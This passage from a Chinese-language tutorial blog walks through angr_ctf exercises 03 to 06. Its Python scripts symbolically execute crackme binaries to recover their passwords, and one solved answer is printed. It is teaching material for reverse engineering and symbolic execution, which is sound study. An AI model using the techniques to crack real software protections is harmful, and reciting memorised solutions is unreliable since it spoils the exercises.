punctuation\">)</span></pre></td></tr></table></figure><p>注意，这不是字符串，而是字节对象，这意味着我们必须使用 b’Good Job.' 而不是仅 &quot;Good Job.&quot; 来检查我们是否正确输出了 “Good Job.”</p>\n<h3 id=\"03_angr_simbolic_registers\"><a class=\"markdownIt-Anchor\" href=\"#03_angr_simbolic_registers\">#</a> 03_angr_simbolic_registers</h3>\n<p>学会符号化寄存器</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">is_successful</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'Good Job.\\n'</span> <span class=\"token keyword\">in</span> stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">should_abort</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'Try again.\\n'</span> <span class=\"token keyword\">in</span> stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Go</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./03_angr_symbolic_registers\"</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    start_address <span class=\"token operator\">=</span> <span class=\"token number\">0x80488c7</span> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>blank_state<span class=\"token punctuation\">(</span>addr<span class=\"token operator\">=</span>start_address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    passwd_size_in_bits <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    passwd0 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd0'</span><span class=\"token punctuation\">,</span> passwd_size_in_bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    passwd1 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd1'</span><span class=\"token punctuation\">,</span> passwd_size_in_bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    passwd2 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd2'</span><span class=\"token punctuation\">,</span> passwd_size_in_bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    initial_state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>eax <span class=\"token operator\">=</span> passwd0</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    initial_state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>ebx <span class=\"token operator\">=</span> passwd1</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    initial_state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>edx <span class=\"token operator\">=</span> passwd2</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_successful<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>should_abort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            solution_state <span class=\"token operator\">=</span> i</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            solution0 <span class=\"token operator\">=</span> <span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>passwd0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            solution1 <span class=\"token operator\">=</span> <span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>passwd1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            solution2 <span class=\"token operator\">=</span> <span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>passwd2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            solution <span class=\"token operator\">=</span> solution0 <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span> <span class=\"token operator\">+</span> solution1 <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span> <span class=\"token operator\">+</span> solution2</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Success! Solution is: &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token comment\"># print(simgr.found[0].posix.dumps(0))</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    Go<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里用到了 claripy 模块，claripy 主要将变量符号化，生成约束式并求解约束式，这也是符号执行的核心所在，在 angr 中主要是利用微软提供的 z3 库去解约束式。</p>\n<h3 id=\"04_angr_symbolic_stack\"><a class=\"markdownIt-Anchor\" href=\"#04_angr_symbolic_stack\">#</a> 04_angr_symbolic_stack</h3>\n<p>学习符号化栈区 (从之前的寄存器传参变成了利用栈空间传参)</p>\n<p><img data-src=\"/images/image-20230411205729603.png\" alt=\"image-20230411205729603\"></p>\n<p>手动布置栈</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">\"04_angr_symbolic_stack\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>startAddr <span class=\"token operator\">=</span> <span class=\"token number\">0x080486AE</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>init_state <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>blank_state<span class=\"token punctuation\">(</span>addr<span class=\"token operator\">=</span>startAddr<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>init_state<span class=\"token punctuation\">.</span>stack_push<span class=\"token punctuation\">(</span>init_state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>ebp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>init_state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>ebp <span class=\"token operator\">=</span> init_state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>esp</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>init_state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>esp <span class=\"token operator\">-=</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>pass1 <span class=\"token operator\">=</span> init_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'pass1'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>pass2 <span class=\"token operator\">=</span> init_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'pass2'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>init_state<span class=\"token punctuation\">.</span>stack_push<span class=\"token punctuation\">(</span>pass1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>init_state<span class=\"token punctuation\">.</span>stack_push<span class=\"token punctuation\">(</span>pass2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sm <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simulation_manager<span class=\"token punctuation\">(</span>init_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">is_good</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">b'Good Job'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">is_bad</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">b'Try again'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>sm<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_good<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>is_bad<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">if</span> sm<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    found_state <span class=\"token operator\">=</span> sm<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    passwodr1 <span class=\"token operator\">=</span> found_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>pass1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    passwodr2 <span class=\"token operator\">=</span> found_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>pass2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Solution:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>passwodr1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>passwodr2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"No solution found!\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"05_angr_symbolic_memory\"><a class=\"markdownIt-Anchor\" href=\"#05_angr_symbolic_memory\">#</a> 05_angr_symbolic_memory</h3>\n<p>学习符号化内存 (符号化.bss 段)</p>\n<p>4 个输入字符串存于内存地址</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">is_successful</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'Good Job.\\n'</span> <span class=\"token keyword\">in</span> stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">should_abort</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'Try again.\\n'</span> <span class=\"token keyword\">in</span> stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Go</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./05_angr_symbolic_memory\"</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">,</span> auto_load_libs<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    start_address <span class=\"token operator\">=</span> <span class=\"token number\">0x08048618</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>blank_state<span class=\"token punctuation\">(</span>addr<span class=\"token operator\">=</span>start_address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    passwd_size_in_bits <span class=\"token operator\">=</span> <span class=\"token number\">64</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    passwd0 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd0'</span><span class=\"token punctuation\">,</span> passwd_size_in_bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    passwd1 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd1'</span><span class=\"token punctuation\">,</span> passwd_size_in_bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    passwd2 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd2'</span><span class=\"token punctuation\">,</span> passwd_size_in_bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    passwd3 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd3'</span><span class=\"token punctuation\">,</span> passwd_size_in_bits<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    passwd0_address <span class=\"token operator\">=</span> <span class=\"token number\">0x0AB232C0</span> <span class=\"token comment\"># user_input addr</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>passwd0_address<span class=\"token punctuation\">,</span> passwd0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>passwd0_address <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> passwd1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>passwd0_address <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> passwd2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    initial_state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>passwd0_address <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> passwd3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_successful<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>should_abort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            solution_state <span class=\"token operator\">=</span> i</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            solution0 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>passwd0<span class=\"token punctuation\">,</span> cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            solution1 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>passwd1<span class=\"token punctuation\">,</span> cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            solution2 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>passwd2<span class=\"token punctuation\">,</span> cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            solution3 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>passwd3<span class=\"token punctuation\">,</span> cast_to<span class=\"token operator\">=</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            solution <span class=\"token operator\">=</span> solution0 <span class=\"token operator\">+</span> <span class=\"token string\">b\" \"</span> <span class=\"token operator\">+</span> solution1 <span class=\"token operator\">+</span> <span class=\"token string\">b\" \"</span> <span class=\"token operator\">+</span> solution2 <span class=\"token operator\">+</span> <span class=\"token string\">b\" \"</span> <span class=\"token operator\">+</span> solution3</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Success! Solution is: &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            <span class=\"token comment\"># print(solution0, solution1, solution2, solution3)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    Go<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>[+] Success! Solution is: OJQVXIVX LLEAOODW UVCWUVVC AJXJMVKA</p>\n<h3 id=\"06_angr_symbolic_dynamic_memory\"><a class=\"markdownIt-Anchor\" href=\"#06_angr_symbolic_dynamic_memory\">#</a> 06_angr_symbolic_dynamic_memory</h3>\n<p>这题主要是学会符号化动态内存，这个题与上题没有太大区别，除了字符串的内存是通过堆 malloc () 而不是堆栈分配的</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token 